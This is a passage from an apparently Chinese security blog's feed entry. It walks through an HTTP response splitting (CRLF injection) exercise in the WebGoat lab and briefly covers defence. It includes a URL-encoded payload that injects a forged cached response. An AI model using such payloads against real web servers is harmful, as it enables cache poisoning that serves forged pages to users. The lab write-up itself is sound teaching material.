text/html;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Last-Modified: Thu, 01 Jan 2099 12:00:00 GMT &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;hacked&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-Type: text/html;charset=ISO-8859-1    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 0    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Date: Thu, 21 Apr 2016 09:45:28 GMT &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;从en到&lt;html&gt;按照url编码，之后得到：&lt;/html&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;en%0d%0aContent-length%3a+0%0d%0a%0d%0aHTTP%2f1.1+200+OK%0d%0aContent-Type%3a+text%2fhtml%3b%0d%0aLast-Modified%3a+Thu%2c+01+Jan+2099+12%3a00%3a00+GMT+%0d%0aContent-length%3a+19%0d%0a%0d%0a%26lt%3bhtml%26gt%3bhacked%26lt%3b%2fhtml%26gt%3b&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以上就是需要的提交的数据，造成缓存中毒了。&lt;/p&gt;
&lt;h2 id=&quot;如何防御&quot;&gt;&lt;a href=&quot;#如何防御&quot; class=&quot;headerlink&quot; title=&quot;如何防御&quot;&gt;&lt;/a&gt;如何防御&lt;/h2&gt;&lt;p&gt;防御CRLF攻击，就是检查用户输入，进行过滤。&lt;/p&gt;
&lt;p&gt;附参考资料：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.techbeta.me/2015/12/wireshark-Loopback/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;解决wireshark抓取本地包的问题&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/04/18/Webgoat之Http_Splitting攻击/&quot;&gt;http://qimingyu.github.io/2016/04/18/Webgoat之Http_Splitting攻击/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;攻击效果与目标&quot;&gt;&lt;a href=&quot;#攻击效果与目标&quot; class=&quot;headerlink&quot; title=&quot;攻击效果与目标&quot;&gt;&lt;/a&gt;攻击效果与目标&lt;/h2&gt;&lt;p&gt;HTTP应答拆分攻击的效果会使用户接收不到正确的服务器回发的信息，而是接收错误的经过伪装的信息，比如挂了马的网页、含有垃圾信息的网页等。采用的是攻击服务器的缓存，所以并不是针对Http服务器的攻击，而是针对具体用户的攻击。&lt;/p&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="Http Splitting" scheme="http://qimingyu.github.io/tags/Http-Splitting/"/>
    
  </entry>
  
</feed>
